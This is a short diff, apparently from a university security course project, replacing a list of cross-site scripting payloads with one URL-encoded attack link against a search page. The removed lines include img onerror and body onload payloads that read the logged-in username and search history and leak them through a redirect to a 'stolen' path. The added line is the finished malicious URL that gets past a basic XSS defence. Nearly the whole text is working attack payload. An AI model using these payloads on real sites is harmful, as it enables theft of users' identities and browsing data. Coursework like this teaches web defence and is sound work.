@@ -1,8 +1,1 @@
-#we can use the following
-<img src=/ onerror=“alert(0)” />
-<body onload="alert(0)">
-
-<img src=/ onerror='$(document).ready(location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text())' />
-
-# don't need the document onload
-<body onload='location.pathname="stolen?xssdefense=1&user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text()'>
+https://eecs388.org/project2/search?xss_defense=1&q=%3Cbody%20onload%3D%27location.pathname%3D%22stolen%3Fxssdefense%3D1%26user%3D%22%20%2B%20%24(%22%23logged-in-user%22).text()%20%2B%20%22%26last_search%3D%22%20%2B%20%24(%22%23history-list%20.history-item%3Aeq(1)%22).text()%27%3E
